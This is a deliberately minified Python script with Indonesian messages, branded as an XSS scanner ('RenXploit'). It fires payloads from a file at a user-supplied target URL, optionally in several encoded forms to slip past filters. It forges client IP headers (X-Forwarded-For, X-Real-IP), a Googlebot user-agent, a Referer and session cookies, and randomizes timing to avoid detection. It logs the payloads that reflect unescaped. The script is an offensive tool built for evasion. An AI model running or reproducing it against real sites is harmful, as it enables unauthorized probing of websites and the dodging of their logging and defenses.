K=exit
J=open
D=input
A=print
import requests as Q,urllib.parse,base64 as P,os,time,random as C
from datetime import datetime as R
E='\x1b[91m'
F='\x1b[92m'
G='\x1b[93m'
L='\x1b[94m'
B='\x1b[0m'
I=[]
def S(filename='useragents.txt'):
	C=filename
	if not os.path.exists(C):A(f"{G}[!] File 'useragents.txt' tidak ditemukan, pakai default user-agent.{B}");return['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)','Mozilla/5.0 (X11; Linux x86_64)','Mozilla/5.0 (Linux; Android 9; Mobile; rv:91.0)','Googlebot/2.1 (+http://www.google.com/bot.html)']
	with J(C,'r')as D:return[A.strip()for A in D if A.strip()]
def T(user_agents):return{'User-Agent':C.choice(user_agents),'X-Forwarded-For':f"{C.randint(1,255)}.{C.randint(0,255)}.{C.randint(0,255)}.{C.randint(1,254)}",'X-Real-IP':'127.0.0.1','Referer':'https://google.com','Cookie':f"SESSIONID={C.randint(100000,999999)}",'Connection':'keep-alive'}
def U(file_name):
	C=file_name
	if not os.path.exists(C):A(f"{E}[!] File payload '{C}' tidak ditemukan!{B}");K()
	with J(C,'r')as D:return[A.strip()for A in D if A.strip()]
def V(payload):A=payload;return list(set([A,urllib.parse.quote(A),urllib.parse.quote_plus(A),urllib.parse.quote(urllib.parse.quote(A)),P.b64encode(A.encode()).decode(),''.join(['\\x{:02x}'.format(ord(A))for A in A])]))
def W(url):B=urllib.parse.urlparse(url);A=urllib.parse.parse_qs(B.query);return list(A.keys())[0]if A else'q'
def M(hasil_file):
	C=hasil_file
	if I:
		with J(C,'w')as D:
			for E in I:D.write(E+'\n')
		A(f"{F}[✔] Hasil disimpan ke: {C}{B}")
	else:A(f"{G}[!] Tidak ada hasil XSS untuk disimpan.{B}")
def X(base_url,timeout,payload_list,user_agents,use_encrypt,hasil_file):
	N=hasil_file;L=base_url;S=W(L);A(f"{G}[i] Parameter digunakan: {S}{B}")
	try:
		for D in payload_list:
			U=V(D)if use_encrypt else[D]
			for O in U:
				try:
					X=T(user_agents);H=f"{L}{O}";J=Q.get(H,headers=X,timeout=timeout,allow_redirects=False)
					if D in J.text and'&lt;'not in J.text and'&gt;'not in J.text and'<'in D and'>'in D:P=R.now().strftime('%H:%M:%S');A(f"\n{F}[{P}] ✅ XSS Terdeteksi!{B}");A(f"{F}Payload: {D}{B}");A(f"{F}URL: {H}{B}");A('-'*50);I.append(f"[{P}] XSS => {H} | Payload: {D}")
					else:A(f"{E}[-] Tidak reflektif: {O}{B}")
					time.sleep(C.uniform(.4,1.2))
				except Exception as Y:A(f"{E}[!] Error saat request: {Y}{B}")
	except KeyboardInterrupt:A(f"\n{G}[!] Dihentikan paksa (Ctrl+C)! Menyimpan hasil...{B}");M(N);K()
	M(N)
A(f"{L}===== RenXploit XSS Reflected Scanner v3 FINAL ====={B}")
H=D('Masukkan URL target (kosong param, contoh: https://target.com/page.php?id=): ').strip()
if not H.startswith('http://')and not H.startswith('https://'):A(f"{E}[!] URL harus diawali http:// atau https://{B}");K()
Y=D('Masukkan nama file payload (contoh: payload.txt): ').strip()
Z=D('Masukkan nama file untuk menyimpan hasil (contoh: hasil.txt): ').strip()
a=D('Gunakan encoded/encrypt payload? (y/n): ').strip().lower()
b=a=='y'
try:N=int(D('Masukkan timeout (default 5): ').strip()or 5)
except:N=5
O=U(Y)
c=S()
A(f"{L}[*] Mulai scanning terhadap: {H} dengan {len(O)} payload...{B}")
X(H,N,O,c,b,Z)
